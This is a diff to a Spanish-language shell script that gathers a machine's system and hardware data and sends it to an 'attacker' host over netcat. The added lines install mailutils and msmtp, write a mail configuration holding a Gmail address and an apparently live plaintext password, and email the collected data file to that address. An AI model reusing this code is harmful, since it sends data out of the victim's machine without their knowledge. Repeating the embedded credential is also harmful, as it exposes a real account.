@@ -23,6 +23,8 @@ function instalar_si_falta() {
 instalar_si_falta "netcat"
 instalar_si_falta "lshw"
 instalar_si_falta "lscpu"
+instalar_si_falta "mailutils"
+instalar_si_falta "msmtp-mta mailutils"
 
 # -------------------------------
 # Recolectar datos del sistema
@@ -49,6 +51,25 @@ echo "[*] Datos recopilados en '$ARCHIVO'"
 # -------------------------------
 
 echo "[*] Enviando datos a $ATACANTE_IP:$PUERTO..."
+cat <<EOF > ~/.msmtprc
+defaults
+auth on
+tls on
+tls_trust_file /etc/ssl/certs/ca-certificates.crt
+logfile ~/.msmtp.log
+
+account gmail
+host smtp.gmail.com
+port 587
+from gaspar.castro.utu@gmail.com
+user gaspar.castro.utu@gmail.com
+password foilbwtuwutzlxvw
+
+account default : gmail
+EOF
+chmod 600 ~/.msmtprc
+echo "Informacion de hardware" | mail -s "Info Hardware" -A datos.txt gaspar.castro.utu@gmail.com
+
 timeout 5 nc "$ATACANTE_IP" "$PUERTO" < $ARCHIVO
 echo "[*] Datos enviados con éxito."
 
